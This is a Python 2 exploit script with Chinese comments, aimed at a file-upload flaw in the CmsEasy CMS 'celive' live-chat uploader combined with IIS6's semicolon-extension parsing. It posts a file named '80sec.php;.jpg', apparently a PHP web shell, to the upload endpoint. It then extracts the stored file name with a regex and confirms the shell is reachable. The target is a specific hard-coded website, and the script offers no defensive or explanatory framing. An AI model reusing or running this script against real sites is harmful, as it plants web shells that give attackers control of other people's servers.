#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#cmseasy文件上传+IIS6解释漏洞   #http://www.shack2.org/article/168.html
#神龙 QQ29295842
#blog http://hi.baidu.com/alalmn
import urllib2
import httplib
import threading
import requests
import re

class cms(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #线程ID

    def run(self):
        try:
            self.cmseasy_IIS6_jx(self.url)  #cmseasy文件上传+IIS6解释漏洞
            print "close cmseasy_IIS6_jx!!!!!"
        except:
            print "-cms-run-try--except!!!!!"

    def URL_DZ(self,URL):  #获取网页内容
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            s = urllib2.urlopen(req,timeout=10)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            return s.read()
        except:
            print u"-cms-URL_DZ %s-try--except!!!!!"%(URL)#消息提示
            return 0

    def http_get(self,host,admin):  #验证地址是否存在
        #print host+"----"+admin
        try:
            connection = httplib.HTTPConnection(host,80,timeout=10)
            connection.request("GET",admin)
            response = connection.getresponse()
            if response.status==200:  #只能显示单个文件    不能显示文件夹
                #SQLdata="http://"+host+admin+"    %s %s"%(response.status, response.reason)
                #print SQLdata
                return 1
            return 0
        except:
            #print u"URL_http线程%d   验证地址异常"%(self.Ht)
            return 0

    def cmseasy_IIS6_jx(self,url):  #cmseasy文件上传+IIS6解释漏洞
        try:
            #http://www.skyscom.com/celive/live/doajaxfileupload.php
            data="http://%s/celive/live/doajaxfileupload.php"%(url)
            if 'jpg' in self.URL_DZ(data):  #检查是否支持JPG
                print "-cms-cmseasy_IIS6_jx-open jpg %s"%(data)
                #上传文件
                files = {'fileToUpload': open('80sec.php;.jpg', 'rb')}
                r = requests.post(data, files=files)
                data=r.text
                name=[]
                try:
                    p = re.compile(r'target=.+?>(.*?)</a>')   #结果 [u'CELIVE-Q7duV0tNj8.php;.jpg']
                    sarr = p.findall(data)#找出一条
                    name=sarr[0]
                except:
                    print "-cms-cmseasy_IIS6_jx-re.compile-try--except!!!!!"
                print name
                data="http://%s/celive/uploadfiles/%s"%(url,name)
                if self.http_get(url,"/celive/uploadfiles/"+name):  #验证地址是否存在
                    print data

        except:
            print "-cms-cmseasy_IIS6_jx-try--except!!!!!"

################################################
if __name__=='__main__':
    threads = []  #线程
    nthreads=1
    for i in range(nthreads):  #nthreads=10  创建10个线程
        threads.append(cms("www.skyscom.com"))

    for t in threads:   #不理解这是什么意思    是结束线程吗
        t.start()  #start就是开始线程



